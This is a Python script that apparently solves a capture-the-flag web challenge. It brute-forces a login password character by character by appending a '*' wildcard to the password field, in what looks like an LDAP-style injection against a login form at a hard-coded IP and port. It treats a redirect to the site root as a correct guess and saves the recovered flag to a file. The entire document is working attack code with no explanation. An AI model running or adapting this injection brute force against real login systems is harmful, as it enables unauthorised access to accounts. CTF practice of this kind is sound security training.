import requests



protocol = "http://"

loginDir = "/login"

challengeSocket = "46.101.84.35:31976"

goalURL = protocol + challengeSocket + "/"

fileName = "flag.txt"



def createDict():

    dictionary = []
    
    for i in range(33,127):
        
        dictionary.append(chr(i))
    
    dictionary.remove("*")
    
    return dictionary



def getPostResponse(URL,payload):
    
    payload += "*"
    
    return requests.post(URL, data = {'username':'Reese','password':payload})



def flagBuilder():
    
    dictionary = createDict()
    
    flag = ""
    
    i = 0
    
    while i <= len(dictionary):

        triedLetter = dictionary[i]
        
        i += 1 
        
        if getPostResponse(protocol + challengeSocket + loginDir, flag + triedLetter).url == goalURL:
            
            flag += triedLetter
            
            print("\"" + flag + "\"" + " works!")
            
            i = 0
            
        if "}" in flag:
            
            flagFile = open(fileName,"w")
            flagFile.write("The flag is: " + flag)        
            flagFile.close()
            break

        
flagBuilder()

try:
    
    f = open(fileName)
    print("\n\nGot you! the flag is in the text file named: " + "\"" + fileName + "\"")
    
except IOError:
    
    print("\n\nBad news :( we couldn't get the flag")
    
finally:
    
    f.close()

input('Press ENTER to exit')


        
    
    
        



 
 
 
 
 
 
 
 
 
 
 
 
 